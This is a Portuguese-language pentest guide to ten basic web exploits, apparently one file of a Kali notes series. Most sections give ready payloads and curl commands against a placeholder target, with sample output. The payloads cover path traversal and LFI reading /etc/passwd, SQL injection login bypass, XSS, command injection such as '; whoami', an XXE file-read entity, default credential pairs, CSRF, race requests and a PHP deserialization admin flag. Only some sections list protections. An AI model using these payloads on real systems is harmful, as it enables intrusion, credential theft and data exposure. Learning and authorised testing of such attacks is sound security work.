# Exploits Simples — Guia Prático

## Introdução

Exploits simples que podem ser executados manualmente sem Metasploit.

---

## 1. Directory Traversal

### Conceito
Acessar arquivos fora do diretório raiz.

### Exemplo
```
/index.php?file=../../../etc/passwd
```

### Teste Manual

```bash
curl "http://target/index.php?file=../../../../etc/passwd"

# Resultado
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

### Proteção
- Validar entrada
- Usar basename()
- Whitelist de arquivos

---

## 2. SQL Injection Básico

### Conceito
Injetar SQL em formulário.

### Exemplo

```bash
# Login
Username: admin' --
Password: (qualquer)

# Query resultante
SELECT * FROM users WHERE username='admin' --' AND password=''
```

### Teste com curl

```bash
curl "http://target/login.php?user=admin' or '1'='1&pass=anything"

# Resultado: Login bem-sucedido
```

### Proteção
- Usar prepared statements
- Input validation
- Least privilege no banco

---

## 3. Cross-Site Scripting (XSS)

### Conceito
Injetar JavaScript no navegador.

### Payload Simples

```javascript
<script>alert('XSS')</script>

<img src=x onerror="alert('XSS')">

<svg onload="alert('XSS')">
```

### Teste em Comentário

Se site permite comentários:

```
Texto: <script>alert('XSS')</script>
```

Resultado: Pop-up de alerta

### Tipos
- **Reflected**: Não armazenado
- **Stored**: Armazenado no banco
- **DOM**: Manipulação do DOM

---

## 4. Command Injection

### Conceito
Executar comandos do sistema.

### Exemplo

Se aplicação executa comando:

```bash
# Payload
; ls -la
| whoami
&& cat /etc/passwd
```

### Teste

```bash
curl "http://target/ping.php?host=8.8.8.8; whoami"

# Resultado
PING 8.8.8.8...
www-data
```

### Proteção
- escapeshellarg()
- Whitelist
- Evitar system()

---

## 5. Weak Authentication

### Senhas Padrão

```
admin:admin
admin:password
root:root
guest:guest
```

### Teste

```bash
curl -u admin:admin http://target/admin

# HTTP 200 = Sucesso
# HTTP 401 = Falha
```

---

## 6. LFI (Local File Inclusion)

### Conceito
Incluir arquivo local no site.

### Exemplo

```
http://target/index.php?page=../../../etc/passwd
```

### Teste

```bash
curl "http://target/index.php?page=../../../../etc/passwd%00"

# %00 = null byte (ignora .php)
```

---

## 7. XXE (XML External Entity)

### Conceito
XML malicioso com entidades externas.

### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Teste

Se site processa XML:

```bash
curl -X POST -d @payload.xml http://target/upload

# Resultado: /etc/passwd exibido
```

---

## 8. CSRF (Cross-Site Request Forgery)

### Conceito
Forçar usuário a fazer ação.

### Exemplo HTML

```html
<img src="http://target/admin/delete_user.php?id=1" />
```

### Teste

Se usuário admin visita página:
- Usuário 1 é deletado
- Sem confirmação

---

## 9. Race Condition

### Conceito
Explorar timing entre operações.

### Exemplo: Compra com Crédito

```
1. Verificar saldo: 100
2. Usuário compra 150 (paralelo)
3. Deduzir saldo: -50
4. Resultado: Compra sucedida mesmo sem saldo
```

### Teste

```bash
# Executar em paralelo
for i in {1..10}; do
  curl http://target/buy.php?item=expensive &
done
```

---

## 10. Insecure Deserialization

### Conceito
Desserializar objeto malicioso.

### Exemplo PHP

```php
$data = unserialize($_GET['data']);
```

Payload:
```bash
?data=O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
```

---

## Tools para Exploração Manual

### Burp Suite

```
Interceptar requisição
Modificar payload
Enviar
Analisar resposta
```

### curl

```bash
# GET
curl "http://target/page?param=value"

# POST
curl -X POST -d "user=admin&pass=test" http://target

# Headers
curl -H "X-Custom: value" http://target

# Cookies
curl -b "PHPSESSID=abc123" http://target
```

### Python

```python
import requests

# GET
r = requests.get('http://target/page')

# POST
r = requests.post('http://target/login', 
                 data={'user': 'admin', 'pass': 'test'})

print(r.status_code)
print(r.text)
```

---

## Checklist de Teste

```
☐ SQL Injection
☐ XSS (Reflected e Stored)
☐ CSRF
☐ LFI/RFI
☐ Command Injection
☐ XXE
☐ Autenticação fraca
☐ Autorização fraca
☐ Insecure Direct Object Reference
☐ Sensitive Data Exposure
```

---

Próximo: Engenharia social com `phishing-kali.md`
